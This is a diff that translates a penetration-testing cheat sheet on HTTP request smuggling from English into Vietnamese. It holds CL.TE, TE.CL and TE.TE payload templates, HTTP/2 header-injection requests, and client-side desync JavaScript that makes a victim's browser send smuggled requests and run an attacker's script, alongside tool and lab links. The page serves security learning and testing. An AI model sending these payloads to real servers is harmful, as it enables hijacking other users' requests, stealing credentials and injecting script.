@@ -1,32 +1,33 @@
 # Request Smuggling
 
-> HTTP Request smuggling occurs when multiple "things" process a request, but differ on how they determine where the request starts/ends. This disagreement can be used to interfere with another user's request/response or to bypass security controls. It normally occurs due to prioritising different HTTP headers (Content-Length vs Transfer-Encoding), differences in handling malformed headers (eg whether to ignore headers with unexpected whitespace), due to downgrading requests from a newer protocol, or due to differences in when a partial request has timed out and should be discarded.
+> HTTP Request Smuggling xảy ra khi nhiều "thành phần" cùng xử lý một request nhưng không thống nhất về cách xác định request bắt đầu/kết thúc ở đâu. Sự khác biệt này có thể được sử dụng để can thiệp vào request/response của người dùng khác hoặc bypass các cơ chế kiểm soát bảo mật. Nó thường xảy ra do các thành phần ưu tiên các HTTP header khác nhau (`Content-Length` so với `Transfer-Encoding`), khác biệt trong cách xử lý header không hợp lệ (ví dụ: có bỏ qua header chứa whitespace bất thường hay không), do downgrade request từ một protocol mới hơn, hoặc do khác biệt về thời điểm một partial request bị timeout và cần được loại bỏ.
 
-## Summary
+## Tóm tắt
 
-* [Tools](#tools)
-* [Methodology](#methodology)
-    * [CL.TE Vulnerabilities](#clte-vulnerabilities)
-    * [TE.CL Vulnerabilities](#tecl-vulnerabilities)
-    * [TE.TE Vulnerabilities](#tete-vulnerabilities)
-    * [HTTP/2 Request Smuggling](#http2-request-smuggling)
-    * [Client-Side Desync](#client-side-desync)
+* [Công cụ](#tools)
+* [Phương pháp](#methodology)
+
+  * [Lỗ hổng CL.TE](#clte-vulnerabilities)
+  * [Lỗ hổng TE.CL](#tecl-vulnerabilities)
+  * [Lỗ hổng TE.TE](#tete-vulnerabilities)
+  * [HTTP/2 Request Smuggling](#http2-request-smuggling)
+  * [Client-Side Desync](#client-side-desync)
 * [Labs](#labs)
-* [References](#references)
+* [Tài liệu tham khảo](#references)
 
-## Tools
+## Công cụ
 
-* [bappstore/HTTP Request Smuggler](https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646) - An extension for Burp Suite designed to help you launch HTTP Request Smuggling attacks
-* [defparam/Smuggler](https://github.com/defparam/smuggler) - An HTTP Request Smuggling / Desync testing tool written in Python 3
-* [dhmosfunk/simple-http-smuggler-generator](https://github.com/dhmosfunk/simple-http-smuggler-generator) - This tool is developed for burp suite practitioner certificate exam and HTTP Request Smuggling labs.
+* [bappstore/HTTP Request Smuggler](https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646) - Extension dành cho Burp Suite được thiết kế để hỗ trợ thực hiện các cuộc tấn công HTTP Request Smuggling.
+* [defparam/Smuggler](https://github.com/defparam/smuggler) - Công cụ kiểm thử HTTP Request Smuggling / Desync được viết bằng Python 3.
+* https://github.com/dhmosfunk/simple-http-smuggler-generator - Công cụ được phát triển cho kỳ thi Burp Suite Practitioner và các lab về HTTP Request Smuggling.
 
-## Methodology
+## Phương pháp
 
-If you want to exploit HTTP Requests Smuggling manually you will face some problems especially in TE.CL vulnerability you have to calculate the chunk size for the second request(malicious request) as PortSwigger suggests `Manually fixing the length fields in request smuggling attacks can be tricky.`.
+Nếu muốn khai thác HTTP Request Smuggling thủ công, bạn sẽ gặp một số vấn đề, đặc biệt với lỗ hổng TE.CL, vì phải tính toán kích thước chunk cho request thứ hai (malicious request), như PortSwigger đề cập: `Manually fixing the length fields in request smuggling attacks can be tricky.`
 
-### CL.TE Vulnerabilities
+### Lỗ hổng CL.TE
 
-> The front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header.
+> Front-end server sử dụng header `Content-Length`, còn back-end server sử dụng header `Transfer-Encoding`.
 
 ```powershell
 POST / HTTP/1.1
@@ -39,7 +40,7 @@ Transfer-Encoding: chunked
 SMUGGLED
 ```
 
-Example:
+Ví dụ:
 
 ```powershell
 POST / HTTP/1.1
@@ -54,9 +55,9 @@ Transfer-Encoding: chunked
 G
 ```
 
-### TE.CL Vulnerabilities
+### Lỗ hổng TE.CL
 
-> The front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header.
+> Front-end server sử dụng header `Transfer-Encoding`, còn back-end server sử dụng header `Content-Length`.
 
 ```powershell
 POST / HTTP/1.1
@@ -69,7 +70,7 @@ SMUGGLED
 0
 ```
 
-Example:
+Ví dụ:
 
 ```powershell
 POST / HTTP/1.1
@@ -90,11 +91,11 @@ x=1
 
 ```
 
-:warning: To send this request using Burp Repeater, you will first need to go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.You need to include the trailing sequence `\r\n\r\n` following the final 0.
+:warning: Để gửi request này bằng Burp Repeater, trước tiên bạn cần vào menu Repeater và đảm bảo tùy chọn `"Update Content-Length"` đã được bỏ chọn. Bạn cần bao gồm chuỗi kết thúc `\r\n\r\n` sau `0` cuối cùng.
 
-### TE.TE Vulnerabilities
+### Lỗ hổng TE.TE
 
-> The front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way.
+> Cả front-end và back-end server đều hỗ trợ header `Transfer-Encoding`, nhưng một trong hai server có thể bị buộc không xử lý header này bằng cách obfuscate header theo một cách nào đó.
 
 ```powershell
 Transfer-Encoding: xchunked
@@ -110,7 +111,7 @@ Transfer-Encoding
 
 ## HTTP/2 Request Smuggling
 
-HTTP/2 request smuggling can occur if a machine converts your HTTP/2 request to HTTP/1.1, and you can smuggle an invalid content-length header, transfer-encoding header or new lines (CRLF) into the translated request. HTTP/2 request smuggling can also occur in a GET request, if you can hide an HTTP/1.1 request inside an HTTP/2 header
+HTTP/2 request smuggling có thể xảy ra nếu một máy chuyển đổi HTTP/2 request của bạn sang HTTP/1.1 và bạn có thể smuggle một `content-length` header không hợp lệ, `transfer-encoding` header hoặc các dòng mới (CRLF) vào request sau khi chuyển đổi. HTTP/2 request smuggling cũng có thể xảy ra trong một GET request nếu bạn có thể ẩn một HTTP/1.1 request bên trong HTTP/2 header.
 
 ```ps1
 :method GET
@@ -121,7 +122,7 @@ header ignored\r\n\r\nGET / HTTP/1.1\r\nHost: www.example.com
 
 ## Client-Side Desync
 
-On some paths, servers don't expect POST requests, and will treat them as simple GET requests, ignoring the payload, eg:
+Trên một số path, server không mong đợi POST request và sẽ xử lý chúng như các GET request đơn giản, bỏ qua payload, ví dụ:
 
 ```ps1
 POST / HTTP/1.1
@@ -132,21 +133,21 @@ GET / HTTP/1.1
 Host: www.example.com
 ```
 
-could be treated as two requests when it should only be one. When the backend server responds twice, the frontend server will assume only the first response is related to this request.
+có thể được xử lý thành hai request trong khi thực tế nó chỉ nên là một request. Khi back-end server phản hồi hai lần, front-end server sẽ giả định rằng chỉ response đầu tiên liên quan đến request này.
 
-To exploit this, an attacker can use JavaScript to trigger their victim to send a POST to the vulnerable site:
+Để khai thác điều này, attacker có thể sử dụng JavaScript để buộc victim gửi một POST request đến vulnerable site:
 
 ```javascript
 fetch('https://www.example.com/', {method: 'POST', body: "GET / HTTP/1.1\r\nHost: www.example.com", mode: 'no-cors', credentials: 'include'} )
 ```
 
-This could be used to:
+Điều này có thể được sử dụng để:
 
-* get the vulnerable site to store a victim's credentials somewhere the attacker can access it
-* get the victim to send an exploit to a site (eg for internal sites the attacker cannot access, or to make it harder to attribute the attack)
-* to get the victim to run arbitrary JavaScript as if it were from the site
+* khiến vulnerable site lưu credentials của victim ở một nơi mà attacker có thể truy cập
+* khiến victim gửi một exploit đến một site (ví dụ: các internal site mà attacker không thể truy cập, hoặc để khiến việc quy kết cuộc tấn công trở nên khó khăn hơn)
+* khiến victim chạy JavaScript tùy ý dưới danh nghĩa của site
 
-**Example**:
+**Ví dụ**:
 
 ```javascript
 fetch('https://www.example.com/redirect', {
@@ -159,10 +160,11 @@ fetch('https://www.example.com/redirect', {
 })
 ```
 
-This script tells the victim browser to send a `POST` request to `www.example.com/redirect`. That returns a redirect which is blocked by CORS, and causes the browser to execute the catch block, by going to `www.example.com`.
+Script này yêu cầu trình duyệt của victim gửi một `POST` request đến `www.example.com/redirect`. Endpoint này trả về một redirect bị CORS chặn, khiến trình duyệt thực thi `catch` block bằng cách chuyển hướng đến `www.example.com`.
 
-`www.example.com` now incorrectly processes the `HEAD` request in the `POST`'s body, instead of the browser's `GET` request, and returns 404 not found with a content-length, before replying to the next misinterpreted third (`GET /x?x=<script>...`) request and finally the browser's actual `GET` request.
-Since the browser only sent one request, it accepts the response to the `HEAD` request as the response to its `GET` request and interprets the third and fourth responses as the body of the response, and thus executes the attacker's script.
+`www.example.com` lúc này xử lý không chính xác request `HEAD` nằm trong body của `POST`, thay vì request `GET` của trình duyệt. Nó trả về `404 not found` cùng với `content-length`, sau đó phản hồi request thứ ba bị diễn giải sai (`GET /x?x=<script>...`) và cuối cùng là request `GET` thực tế của trình duyệt.
+
+Do trình duyệt chỉ gửi một request, nó chấp nhận response của request `HEAD` như response cho request `GET` của mình và diễn giải response thứ ba và thứ tư như body của response. Vì vậy, nó thực thi script của attacker.
 
 ## Labs
 
@@ -172,7 +174,7 @@ Since the browser only sent one request, it accepts the response to the `HEAD` r
 * [PortSwigger - Response queue poisoning via H2.TE request smuggling](https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling)
 * [PortSwigger - Client-side desync](https://portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-client-side-desync)
 
-## References
+## Tài liệu tham khảo
 
 * [A Pentester's Guide to HTTP Request Smuggling - Busra Demir - October 16, 2020](https://web.archive.org/web/20260111201639/https://www.cobalt.io/blog/a-pentesters-guide-to-http-request-smuggling)
 * [Advanced Request Smuggling - PortSwigger - October 26, 2021](https://web.archive.org/web/20260228102047/https://portswigger.net/web-security/request-smuggling/advanced)
